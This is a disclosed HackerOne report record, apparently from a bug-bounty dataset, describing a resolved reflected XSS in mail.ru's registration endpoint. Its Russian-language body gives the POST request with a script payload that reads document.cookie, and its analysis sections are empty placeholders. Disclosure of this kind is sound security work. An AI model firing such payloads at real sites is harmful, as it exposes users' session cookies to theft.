---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '15654'
original_report_id: '15654'
title: Reflected XSS
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2014-06-08T19:22:21.330Z'
disclosed_at: '2014-08-07T14:09:42.667Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS

## Metadata

- HackerOne Report ID: 15654
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2014-08-07T14:09:42.667Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Уязвимость существует на сайте http://aa.mail.ru/

в сценарии  http://aa.mail.ru/dynamic/user/?a=register

Посылаем такой пакет данных
[POST]  
mail=<script>alert(document.cookie)</script>&mailru_domains=mail.ru&password_mailru=&password_general=&name=kaktakoaddd

Получаем активный alert()

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
